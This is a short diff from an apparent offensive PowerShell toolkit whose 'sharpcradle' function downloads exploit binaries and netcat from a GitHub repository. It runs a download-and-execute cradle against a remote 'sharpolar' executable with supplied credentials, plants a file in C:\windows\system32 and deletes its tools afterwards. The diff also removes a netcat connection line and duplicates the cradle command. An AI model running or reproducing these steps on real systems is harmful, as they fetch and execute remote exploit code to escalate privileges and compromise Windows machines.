@@ -174,8 +174,9 @@ function sharpcradle{
 		Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/schtasks.exe -Outfile $currentPath\schtasks.exe
 		Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/test.job -Outfile $currentPath\test.job
 		Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/nc.exe -Outfile C:\temp\nc.exe
-		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/sharppolar.exe license.rtf $username $password
-		cmd /c start powershell -Command {C:\temp\nc.exe 127.0.0.1 2000}
+		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/sharpolar.exe license.rtf $username $password
+		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/sharpolar.exe license.rtf $username $password
+		
 		move env:USERPROFILE\Appdata\Local\temp\license.rtf C:\windows\system32\license.rtf
 		del .\cradle.exe
 		del .\schedsvc.dll
